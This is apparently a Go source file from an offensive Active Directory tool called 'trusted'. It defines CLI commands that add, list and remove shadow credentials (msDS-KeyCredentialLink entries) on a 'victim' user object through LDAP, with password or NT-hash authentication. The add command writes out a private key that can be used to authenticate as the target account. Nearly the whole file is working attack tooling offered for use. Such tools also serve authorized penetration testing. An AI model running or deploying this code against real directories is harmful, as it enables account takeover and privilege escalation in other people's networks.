package main

import (
	"encoding/json"
	"fmt"
	"os"
	"strings"

	"github.com/loudmumble/trusted/pkg/pki"
	"github.com/spf13/cobra"
)

var shadowCmd = &cobra.Command{
	Use:   "shadow {add|list|rm} <target>",
	Short: "Shadow credentials — msDS-KeyCredentialLink attacks",
	Long: `Manage shadow credentials on AD user objects via msDS-KeyCredentialLink.

Examples:
  trusted shadow add victim -d corp.local -dc dc01
  ted shadow list victim
  ted shadow rm victim --device-id <guid>`,
	RunE: func(cmd *cobra.Command, args []string) error {
		return cmd.Help()
	},
}

var shadowAddCmd = &cobra.Command{
	Use:   "add <target>",
	Short: "Add a shadow credential",
	Args:  cobra.ExactArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		target := args[0]
		cfg := buildADCSConfig(cmd)
		if cfg.TargetDC == "" || cfg.Domain == "" {
			return fmt.Errorf("-dc and -d are required")
		}
		if !cfg.Kerberos && (cfg.Username == "" || (cfg.Password == "" && cfg.Hash == "")) {
			return fmt.Errorf("LDAP auth required: -u <user> -p <pass> (or -H <NT_HASH> or -k)")
		}
		if target == "" {
			return fmt.Errorf("target (sAMAccountName or DN) is required")
		}
		if !strings.Contains(target, ",") {
			resolved, err := pki.ResolveSAMAccountName(cfg, target)
			if err != nil {
				return fmt.Errorf("resolve target %q: %w", target, err)
			}
			target = resolved
		}

		entry, err := pki.GenerateKeyCredential()
		if err != nil {
			return fmt.Errorf("generate key credential: %w", err)
		}

		keyPath := fmt.Sprintf("shadow_%s.key", entry.DeviceID[:8])
		keyFile, err := os.Create(keyPath)
		if err != nil {
			return fmt.Errorf("write key file: %w", err)
		}
		if err := pki.WriteECPrivateKey(keyFile, entry.PrivateKey); err != nil {
			keyFile.Close()
			os.Remove(keyPath)
			return fmt.Errorf("write key: %w", err)
		}
		keyFile.Close()

		if _, err := pki.AddShadowCredentialWithEntry(cfg, target, entry); err != nil {
			os.Remove(keyPath)
			return err
		}

		outputJSON, _ := cmd.Flags().GetBool("json")
		if outputJSON {
			res := map[string]string{
				"status":    "success",
				"key_path":  keyPath,
				"target":    target,
				"device_id": entry.DeviceID,
			}
			data, _ := json.MarshalIndent(res, "", "  ")
			fmt.Println(string(data))
			return nil
		}

		fmt.Printf("[+] Private key written to: %s\n", keyPath)
		return nil
	},
}

var shadowListCmd = &cobra.Command{
	Use:   "list <target>",
	Short: "List shadow credentials on target",
	Args:  cobra.ExactArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		target := args[0]
		cfg := buildADCSConfig(cmd)
		if cfg.TargetDC == "" || cfg.Domain == "" {
			return fmt.Errorf("-dc and -d are required")
		}
		if !cfg.Kerberos && (cfg.Username == "" || (cfg.Password == "" && cfg.Hash == "")) {
			return fmt.Errorf("LDAP auth required: -u <user> -p <pass> (or -H <NT_HASH> or -k)")
		}
		if !strings.Contains(target, ",") {
			resolved, err := pki.ResolveSAMAccountName(cfg, target)
			if err != nil {
				return fmt.Errorf("resolve target %q: %w", target, err)
			}
			target = resolved
		}

		creds, err := pki.ListShadowCredentials(cfg, target)
		if err != nil {
			return err
		}

		outputJSON, _ := cmd.Flags().GetBool("json")
		if outputJSON {
			data, _ := json.MarshalIndent(creds, "", "  ")
			fmt.Println(string(data))
			return nil
		}

		if len(creds) == 0 {
			fmt.Println("[*] No KeyCredentialLink values found")
			return nil
		}

		fmt.Printf("[+] Found %d KeyCredentialLink entries:\n\n", len(creds))
		for _, cred := range creds {
			fmt.Printf("  Entry %d:\n", cred.EntryIndex)
			if cred.DN != "" {
				fmt.Printf("    DN:   %s\n", cred.DN)
				if len(cred.BlobHex) > 32 {
					fmt.Printf("    Blob: %s... (%d bytes)\n", cred.BlobHex[:32], cred.BlobLength)
				}
			} else {
				fmt.Printf("    Raw: %s\n", cred.Raw)
			}
			fmt.Println()
		}
		return nil
	},
}

var shadowRemoveCmd = &cobra.Command{
	Use:   "rm <target>",
	Short: "Remove a shadow credential by device ID",
	Args:  cobra.ExactArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		target := args[0]
		cfg := buildADCSConfig(cmd)
		if cfg.TargetDC == "" || cfg.Domain == "" {
			return fmt.Errorf("-dc and -d are required")
		}
		if !cfg.Kerberos && (cfg.Username == "" || (cfg.Password == "" && cfg.Hash == "")) {
			return fmt.Errorf("LDAP auth required: -u <user> -p <pass> (or -H <NT_HASH> or -k)")
		}
		if !strings.Contains(target, ",") {
			resolved, err := pki.ResolveSAMAccountName(cfg, target)
			if err != nil {
				return fmt.Errorf("resolve target %q: %w", target, err)
			}
			target = resolved
		}

		deviceID, _ := cmd.Flags().GetString("device-id")
		if deviceID == "" {
			return fmt.Errorf("--device-id is required for removal")
		}

		err := pki.RemoveShadowCredential(cfg, target, deviceID)
		outputJSON, _ := cmd.Flags().GetBool("json")
		if outputJSON {
			status := "success"
			if err != nil {
				status = err.Error()
			}
			res := map[string]string{
				"status":    status,
				"target":    target,
				"device_id": deviceID,
			}
			data, _ := json.MarshalIndent(res, "", "  ")
			fmt.Println(string(data))
			return nil
		}
		return err
	},
}

func init() {
	rootCmd.AddCommand(shadowCmd)
	shadowCmd.AddCommand(shadowAddCmd)
	shadowCmd.AddCommand(shadowListCmd)
	shadowCmd.AddCommand(shadowRemoveCmd)

	shadowRemoveCmd.Flags().String("device-id", "", "Device ID to remove")
}
